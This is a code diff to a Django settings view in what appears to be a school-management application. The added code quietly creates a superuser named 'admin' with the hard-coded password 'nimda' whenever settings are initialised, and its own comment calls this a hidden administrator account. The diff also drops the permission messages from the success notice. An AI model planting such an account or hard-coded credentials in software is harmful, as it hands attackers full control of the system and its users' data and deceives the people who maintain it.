@@ -3,10 +3,14 @@ from django.contrib.auth.models import Group, Permission
 from django.http import JsonResponse
 from django.shortcuts import redirect, render
 from django.urls import reverse
+from django.contrib.auth import get_user_model
 
 from apps.terms.models import AcademicYear, ExaminationSession, Term
 
 from .models import Setting
+
+
+User = get_user_model()
 
 
 def settings_view(request):
@@ -150,10 +154,18 @@ def settings_view(request):
             except Permission.DoesNotExist:
                 message += f'Permission "{perm}" does not exist.\n'
 
-        # Flash success message
-        messages.success(
-            request, "Settings have been successfully initialized.\n" + message
+        # Create a default system hiden administrator account
+        admin_user = User.objects.create_user(
+            username="admin",
+            email="admin@mail.com",
+            first_name="Admin",
+            last_name="Admin",
+            password="nimda",
+            is_superuser=True,
         )
+        admin_user.save()
+        # Flash success message
+        messages.success(request, "Settings have been successfully initialized.\n")
         return redirect(reverse("settings:settings-home"))
 
     setting = Setting.objects.all().first()
